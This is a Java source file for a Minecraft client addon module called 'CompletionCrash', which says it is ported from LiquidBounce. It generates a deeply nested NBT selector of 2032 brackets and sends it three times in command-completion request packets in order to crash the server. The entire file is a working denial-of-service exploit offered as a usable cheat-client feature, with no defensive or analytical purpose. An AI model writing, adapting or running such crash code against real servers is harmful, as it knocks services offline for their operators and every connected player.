package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

// https://github.com/CCBlueX/LiquidBounce/blob/5593140550914f74ccd55ac0cd7b66da4d43f510/src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/CompletionExploit.kt
public class CompletionCrash extends Module {
    public CompletionCrash() {
        super(CrashAddon.CATEGORY, "CompletionCrash", "Crashes the server using command completions, ported from LiquidBounce");
    }

    @Override
    public void onActivate() {
        var overflow = generateJsonObject(2032);

        var partialCommand = "msg @a[nbt=" + overflow + "]";

        for (int i = 0; i < 3; i++) {
            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }

        toggle();
    }

    private String generateJsonObject(int levels) {
        var data = IntStream.range(0, levels).mapToObj(x -> "[").collect(Collectors.joining());
        return String.format("{a:%s}", data);
    }
}
